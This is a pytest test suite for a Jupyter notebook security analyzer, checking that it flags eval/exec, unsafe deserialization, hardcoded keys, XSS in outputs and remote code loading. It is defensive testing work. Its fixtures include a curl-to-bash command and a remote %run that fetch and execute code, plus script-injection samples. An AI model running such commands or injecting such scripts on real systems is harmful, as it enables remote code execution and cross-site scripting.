"""
Tests for Jupyter Notebook Security Analyzer.
"""

import json
import pytest
from pathlib import Path
from unittest.mock import Mock, patch

try:
    import nbformat
    from nbformat import v4 as nbf
    NBFORMAT_AVAILABLE = True
except ImportError:
    NBFORMAT_AVAILABLE = False
    nbf = None

from pyguard.lib.notebook_analyzer import (
    NotebookSecurityAnalyzer,
    NotebookFinding,
    NotebookAnalysisResult,
    NBFORMAT_AVAILABLE,
)


@pytest.mark.skipif(not NBFORMAT_AVAILABLE, reason="nbformat not available")
class TestNotebookSecurityAnalyzer:
    """Test suite for NotebookSecurityAnalyzer."""
    
    @pytest.fixture
    def analyzer(self):
        """Create analyzer instance."""
        return NotebookSecurityAnalyzer()
    
    @pytest.fixture
    def temp_notebook(self, tmp_path):
        """Create a temporary notebook file."""
        def _create_notebook(cells):
            nb = nbf.new_notebook()
            nb.cells = cells
            
            nb_path = tmp_path / "test_notebook.ipynb"
            with open(nb_path, 'w', encoding='utf-8') as f:
                nbformat.write(nb, f)
            
            return nb_path
        
        return _create_notebook
    
    def test_analyzer_initialization(self, analyzer):
        """Test analyzer initializes correctly."""
        assert analyzer is not None
        assert hasattr(analyzer, 'secret_patterns')
        assert hasattr(analyzer, 'dangerous_functions')
        assert 'eval' in analyzer.dangerous_functions
        assert 'pickle.load' in analyzer.dangerous_functions
    
    def test_detect_eval_function(self, analyzer, temp_notebook):
        """Test detection of eval() usage."""
        cells = [
            nbf.new_code_cell('result = eval("1 + 1")')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        assert result.total_count() > 0
        eval_findings = [f for f in result.findings if f.rule_id == 'NB-INJECT-001']
        assert len(eval_findings) == 1
        assert eval_findings[0].severity == 'CRITICAL'
        assert 'eval()' in eval_findings[0].message
    
    def test_detect_exec_function(self, analyzer, temp_notebook):
        """Test detection of exec() usage."""
        cells = [
            nbf.new_code_cell('exec("print(1)")')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        exec_findings = [f for f in result.findings if f.rule_id == 'NB-INJECT-002']
        assert len(exec_findings) == 1
        assert exec_findings[0].severity == 'CRITICAL'
    
    def test_detect_pickle_load(self, analyzer, temp_notebook):
        """Test detection of unsafe pickle.load()."""
        cells = [
            nbf.new_code_cell('''
import pickle
with open('data.pkl', 'rb') as f:
    data = pickle.load(f)
''')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        pickle_findings = [f for f in result.findings if f.rule_id == 'NB-DESERIAL-001']
        assert len(pickle_findings) == 1
        assert pickle_findings[0].severity == 'CRITICAL'
        assert 'CWE-502' in pickle_findings[0].cwe_id
    
    def test_detect_torch_load_unsafe(self, analyzer, temp_notebook):
        """Test detection of torch.load() without weights_only."""
        cells = [
            nbf.new_code_cell('''
import torch
model = torch.load('model.pth')
''')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        torch_findings = [f for f in result.findings if f.rule_id == 'NB-ML-001']
        assert len(torch_findings) == 1
        assert torch_findings[0].severity == 'CRITICAL'
        assert 'weights_only' in torch_findings[0].message
    
    def test_detect_yaml_load_unsafe(self, analyzer, temp_notebook):
        """Test detection of unsafe yaml.load()."""
        cells = [
            nbf.new_code_cell('''
import yaml
data = yaml.load(open('config.yml'))
''')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        yaml_findings = [f for f in result.findings if f.rule_id == 'NB-DESERIAL-002']
        assert len(yaml_findings) == 1
        assert yaml_findings[0].severity == 'CRITICAL'
    
    def test_detect_aws_key(self, analyzer, temp_notebook):
        """Test detection of AWS access keys."""
        cells = [
            nbf.new_code_cell('aws_key = "AKIAIOSFODNN7EXAMPLE"')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        secret_findings = [f for f in result.findings if 'SECRET' in f.rule_id]
        assert len(secret_findings) > 0
        aws_findings = [f for f in secret_findings if 'AWS' in f.rule_id]
        assert len(aws_findings) == 1
        assert aws_findings[0].severity == 'CRITICAL'
    
    def test_detect_github_token(self, analyzer, temp_notebook):
        """Test detection of GitHub tokens."""
        cells = [
            nbf.new_code_cell('token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz"')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        github_findings = [f for f in result.findings if 'GITHUB' in f.rule_id]
        assert len(github_findings) == 1
        assert github_findings[0].severity == 'CRITICAL'
    
    def test_detect_openai_key(self, analyzer, temp_notebook):
        """Test detection of OpenAI API keys."""
        cells = [
            nbf.new_code_cell('api_key = "sk-1234567890abcdefghijklmnopqrstuvwxyz"')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        openai_findings = [f for f in result.findings if 'OPENAI' in f.rule_id]
        assert len(openai_findings) == 1
    
    def test_detect_high_entropy_string(self, analyzer, temp_notebook):
        """Test detection of high-entropy strings."""
        cells = [
            nbf.new_code_cell('secret = "dGhpc2lzYXZlcnlsb25nc3RyaW5ndGhhdGlzYmFzZTY0ZW5jb2RlZA=="')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        entropy_findings = [f for f in result.findings if f.rule_id == 'NB-SECRET-ENTROPY']
        assert len(entropy_findings) > 0
        assert entropy_findings[0].severity == 'HIGH'
    
    def test_detect_shell_pipe_to_bash(self, analyzer, temp_notebook):
        """Test detection of dangerous shell pipes."""
        cells = [
            nbf.new_code_cell('!curl https://example.com/script.sh | bash')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        shell_findings = [f for f in result.findings if f.rule_id == 'NB-SHELL-002']
        assert len(shell_findings) == 1
        assert shell_findings[0].severity == 'CRITICAL'
        assert 'curl|bash' in shell_findings[0].message or 'Remote code' in shell_findings[0].message
    
    def test_detect_unpinned_pip_install(self, analyzer, temp_notebook):
        """Test detection of unpinned pip installs."""
        cells = [
            nbf.new_code_cell('%pip install torch transformers')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        repro_findings = [f for f in result.findings if f.rule_id == 'NB-REPRO-001']
        assert len(repro_findings) == 1
        assert repro_findings[0].severity == 'MEDIUM'
    
    def test_detect_remote_run(self, analyzer, temp_notebook):
        """Test detection of %run with remote URLs."""
        cells = [
            nbf.new_code_cell('%run https://example.com/script.py')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        run_findings = [f for f in result.findings if f.rule_id == 'NB-SHELL-003']
        assert len(run_findings) == 1
        assert run_findings[0].severity == 'CRITICAL'
    
    def test_detect_xss_in_html_output(self, analyzer, temp_notebook):
        """Test detection of XSS in HTML outputs."""
        cell = nbf.new_code_cell('from IPython.display import HTML, display')
        cell.outputs = [
            nbf.new_output(
                output_type='display_data',
                data={
                    'text/html': '<script>alert("XSS")</script>'
                }
            )
        ]
        cells = [cell]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        xss_findings = [f for f in result.findings if 'XSS' in f.rule_id]
        assert len(xss_findings) > 0
        assert any(f.severity == 'HIGH' for f in xss_findings)
    
    def test_detect_javascript_output(self, analyzer, temp_notebook):
        """Test detection of JavaScript in outputs."""
        cell = nbf.new_code_cell('print("test")')
        cell.outputs = [
            nbf.new_output(
                output_type='display_data',
                data={
                    'application/javascript': 'console.log("test");'
                }
            )
        ]
        cells = [cell]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        js_findings = [f for f in result.findings if f.rule_id == 'NB-XSS-001']
        assert len(js_findings) == 1
        assert js_findings[0].severity == 'HIGH'
    
    def test_detect_secrets_in_output(self, analyzer, temp_notebook):
        """Test detection of secrets in cell outputs."""
        cell = nbf.new_code_cell('print(api_key)')
        cell.outputs = [
            nbf.new_output(
                output_type='stream',
                name='stdout',
                text='sk-1234567890abcdefghijklmnopqrstuvwxyz\n'
            )
        ]
        cells = [cell]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        secret_findings = [f for f in result.findings if 'SECRET' in f.rule_id]
        assert len(secret_findings) > 0
    
    def test_detect_secrets_in_markdown(self, analyzer, temp_notebook):
        """Test detection of secrets in markdown cells."""
        cells = [
            nbf.new_markdown_cell('API Key: AKIAIOSFODNN7EXAMPLE')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        secret_findings = [f for f in result.findings if 'SECRET' in f.rule_id]
        assert len(secret_findings) > 0
    
    def test_empty_notebook(self, analyzer, temp_notebook):
        """Test analysis of empty notebook."""
        cells = []
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        assert result.cell_count == 0
        assert result.code_cell_count == 0
        assert result.total_count() == 0
    
    def test_clean_notebook(self, analyzer, temp_notebook):
        """Test analysis of clean notebook with no issues."""
        cells = [
            nbf.new_code_cell('''
import numpy as np
data = np.array([1, 2, 3])
print(data.mean())
''')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        assert result.code_cell_count == 1
        # Should have no critical findings
        assert result.critical_count() == 0
    
    def test_execution_order_valid(self, analyzer, temp_notebook):
        """Test detection of valid execution order."""
        cell1 = nbf.new_code_cell('x = 1')
        cell1.execution_count = 1
        
        cell2 = nbf.new_code_cell('y = x + 1')
        cell2.execution_count = 2
        
        cells = [cell1, cell2]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        assert result.execution_count_valid is True
    
    def test_execution_order_invalid(self, analyzer, temp_notebook):
        """Test detection of invalid execution order."""
        cell1 = nbf.new_code_cell('x = 1')
        cell1.execution_count = 2
        
        cell2 = nbf.new_code_cell('y = x + 1')
        cell2.execution_count = 1
        
        cells = [cell1, cell2]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        assert result.execution_count_valid is False
    
    def test_multiple_issues_in_one_cell(self, analyzer, temp_notebook):
        """Test detection of multiple issues in a single cell."""
        cells = [
            nbf.new_code_cell('''
api_key = "sk-1234567890abcdefghijklmnopqrstuvwxyz"
result = eval(user_input)
data = pickle.load(open('data.pkl', 'rb'))
''')
        ]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        assert result.total_count() >= 3
        assert result.critical_count() >= 3
    
    def test_sarif_report_generation(self, analyzer, temp_notebook):
        """Test SARIF report generation."""
        cells = [
            nbf.new_code_cell('result = eval("1 + 1")')
        ]
        nb_path = temp_notebook(cells)
        
        analysis_result = analyzer.analyze_notebook(nb_path)
        sarif = analyzer.generate_sarif_report([analysis_result])
        
        assert sarif['version'] == '2.1.0'
        assert 'runs' in sarif
        assert len(sarif['runs']) == 1
        assert 'tool' in sarif['runs'][0]
        assert 'results' in sarif['runs'][0]
        assert len(sarif['runs'][0]['results']) > 0
    
    def test_sarif_report_with_multiple_notebooks(self, analyzer, temp_notebook, tmp_path):
        """Test SARIF report with multiple notebooks."""
        # Create first notebook
        cells1 = [nbf.new_code_cell('eval("1")')]
        nb_path1 = temp_notebook(cells1)
        
        # Create second notebook
        cells2 = [nbf.new_code_cell('exec("print(1)")')]
        nb2 = nbf.new_notebook()
        nb2.cells = cells2
        nb_path2 = tmp_path / "test_notebook2.ipynb"
        with open(nb_path2, 'w', encoding='utf-8') as f:
            nbformat.write(nb2, f)
        
        result1 = analyzer.analyze_notebook(nb_path1)
        result2 = analyzer.analyze_notebook(nb_path2)
        
        sarif = analyzer.generate_sarif_report([result1, result2])
        
        assert len(sarif['runs'][0]['results']) >= 2
    
    def test_calculate_entropy(self, analyzer):
        """Test entropy calculation."""
        # Low entropy (repeating characters)
        low_entropy = analyzer._calculate_entropy('aaaaaaaaaa')
        assert low_entropy < 1.0
        
        # High entropy (random-like)
        high_entropy = analyzer._calculate_entropy('dGhpc2lzYXZlcnlsb25nc3RyaW5n')
        assert high_entropy > 3.0
        
        # Empty string
        zero_entropy = analyzer._calculate_entropy('')
        assert zero_entropy == 0.0
    
    def test_get_function_name_simple(self, analyzer):
        """Test function name extraction for simple calls."""
        code = 'eval("1")'
        tree = ast.parse(code)
        call_node = tree.body[0].value
        
        name = analyzer._get_function_name(call_node)
        assert name == 'eval'
    
    def test_get_function_name_module(self, analyzer):
        """Test function name extraction for module.function calls."""
        code = 'pickle.load(f)'
        tree = ast.parse(code)
        call_node = tree.body[0].value
        
        name = analyzer._get_function_name(call_node)
        assert name == 'pickle.load'
    
    def test_finding_severity_counts(self):
        """Test finding severity counting methods."""
        result = NotebookAnalysisResult(
            notebook_path=Path('test.ipynb'),
            findings=[
                NotebookFinding(
                    rule_id='TEST-001',
                    severity='CRITICAL',
                    cell_index=0,
                    cell_type='code',
                    line_number=1,
                    message='Test',
                    description='Test finding'
                ),
                NotebookFinding(
                    rule_id='TEST-002',
                    severity='HIGH',
                    cell_index=0,
                    cell_type='code',
                    line_number=2,
                    message='Test',
                    description='Test finding'
                ),
                NotebookFinding(
                    rule_id='TEST-003',
                    severity='MEDIUM',
                    cell_index=0,
                    cell_type='code',
                    line_number=3,
                    message='Test',
                    description='Test finding'
                ),
            ],
            cell_count=1,
            code_cell_count=1,
            has_outputs=False,
            execution_count_valid=True,
        )
        
        assert result.critical_count() == 1
        assert result.high_count() == 1
        assert result.total_count() == 3


@pytest.mark.skipif(not NBFORMAT_AVAILABLE, reason="nbformat not available")
class TestNotebookSecurityAdvanced:
    """Advanced test cases for edge cases and complex scenarios."""
    
    @pytest.fixture
    def analyzer(self):
        """Create analyzer instance."""
        return NotebookSecurityAnalyzer()
    
    @pytest.fixture
    def temp_notebook(self, tmp_path):
        """Create a temporary notebook file."""
        def _create_notebook(cells):
            nb = nbf.new_notebook()
            nb.cells = cells
            
            nb_path = tmp_path / "test_notebook.ipynb"
            with open(nb_path, 'w', encoding='utf-8') as f:
                nbformat.write(nb, f)
            
            return nb_path
        
        return _create_notebook
    
    def test_syntax_error_in_cell(self, analyzer, temp_notebook):
        """Test handling of cells with syntax errors."""
        cells = [
            nbf.new_code_cell('this is not valid python syntax !')
        ]
        nb_path = temp_notebook(cells)
        
        # Should not crash, just skip AST analysis
        result = analyzer.analyze_notebook(nb_path)
        assert result is not None
    
    def test_event_handler_in_html(self, analyzer, temp_notebook):
        """Test detection of event handlers in HTML."""
        cell = nbf.new_code_cell('display(HTML(html_str))')
        cell.outputs = [
            nbf.new_output(
                output_type='display_data',
                data={
                    'text/html': '<div onclick="alert()">Click me</div>'
                }
            )
        ]
        cells = [cell]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        xss_findings = [f for f in result.findings if f.rule_id == 'NB-XSS-003']
        assert len(xss_findings) == 1
    
    def test_javascript_url_in_html(self, analyzer, temp_notebook):
        """Test detection of javascript: URLs."""
        cell = nbf.new_code_cell('display(HTML(html_str))')
        cell.outputs = [
            nbf.new_output(
                output_type='display_data',
                data={
                    'text/html': '<a href="javascript:void(0)">Link</a>'
                }
            )
        ]
        cells = [cell]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        xss_findings = [f for f in result.findings if f.rule_id == 'NB-XSS-004']
        assert len(xss_findings) == 1
    
    def test_multiline_output_text(self, analyzer, temp_notebook):
        """Test handling of multiline output text."""
        cell = nbf.new_code_cell('print(secret)')
        cell.outputs = [
            nbf.new_output(
                output_type='stream',
                name='stdout',
                text=['Line 1\n', 'AKIAIOSFODNN7EXAMPLE\n', 'Line 3\n']
            )
        ]
        cells = [cell]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        secret_findings = [f for f in result.findings if 'AWS' in f.rule_id]
        assert len(secret_findings) > 0
    
    def test_multiline_html_output(self, analyzer, temp_notebook):
        """Test handling of multiline HTML output."""
        cell = nbf.new_code_cell('display(HTML(html))')
        cell.outputs = [
            nbf.new_output(
                output_type='display_data',
                data={
                    'text/html': ['<div>\n', '<script>alert(1)</script>\n', '</div>']
                }
            )
        ]
        cells = [cell]
        nb_path = temp_notebook(cells)
        
        result = analyzer.analyze_notebook(nb_path)
        
        xss_findings = [f for f in result.findings if 'XSS' in f.rule_id]
        assert len(xss_findings) > 0


@pytest.mark.skipif(NBFORMAT_AVAILABLE, reason="nbformat is available in test environment")
def test_import_without_nbformat():
    """Test that module can be imported even without nbformat."""
    # This test verifies the graceful degradation
    # Skip when nbformat is available since the behavior is different
    with patch('pyguard.lib.notebook_analyzer.NBFORMAT_AVAILABLE', False):
        # Should still be able to import
        from pyguard.lib.notebook_analyzer import NotebookSecurityAnalyzer
        
        # But should raise error when trying to use
        with pytest.raises(ImportError, match="nbformat is required"):
            NotebookSecurityAnalyzer()


# Import ast for tests
import ast
